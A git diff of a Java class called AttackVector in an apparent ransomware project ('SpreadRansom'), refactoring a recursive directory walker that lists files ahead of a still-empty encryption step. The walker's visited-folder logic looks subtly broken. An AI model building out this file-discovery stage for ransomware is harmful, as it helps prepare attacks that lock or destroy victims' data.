@@ -7,13 +7,18 @@ import SpreadR.SpreadRansom;
 
 public class AttackVector implements SpreadRansom {
 
-	private boolean isVisitedFolder(File file, Collection<File> folderTree) {
-		for (File directory : folderTree) {
-			if (directory.getName() == file.getName()) {
-				return true;
+	public boolean isVisitedFolder(File file, Collection<File> folderTree) {
+		if (folderTree == null)
+			return false;
+		else {
+			for (File directory : folderTree) {
+
+				if (directory.getName() == file.getName()) {
+					return true;
+				}
 			}
-		}return false;
-		
+			return false;
+		}
 
 	}
 
@@ -23,23 +28,26 @@ public class AttackVector implements SpreadRansom {
 
 		// Get all files from a directory.
 		File[] fList = directory.listFiles();
-		if (fList != null)
+		if (fList != null) {
 			for (File file : fList) {
 				if (file.isDirectory()) {
-					if (!isVisitedFolder(file, dirs)) {
-						dirs.add(file);
-						listf(file.getAbsolutePath(), dirs);
-						System.out.println("directory:" + file.getName() + "\n");
-						//
-					} else if (file.isFile()) {
-
-						System.out.println("\t" + file.getName());
-						//encryption
-
+					try {
+						if (isVisitedFolder(file, dirs) == false) {
+							dirs.add(file);
+						}
+					} catch (NullPointerException e) {
 					}
-				}
+					System.out.println("directory:" + file.getName() + "\n");
+					listf(file.getAbsolutePath(), dirs);
 
+					//
+				} else if (file.isFile()) {
+					System.out.println("\t" + file.getName());
+					// encryption
+
+				}
 			}
+		}
 	}
 
 	@Override
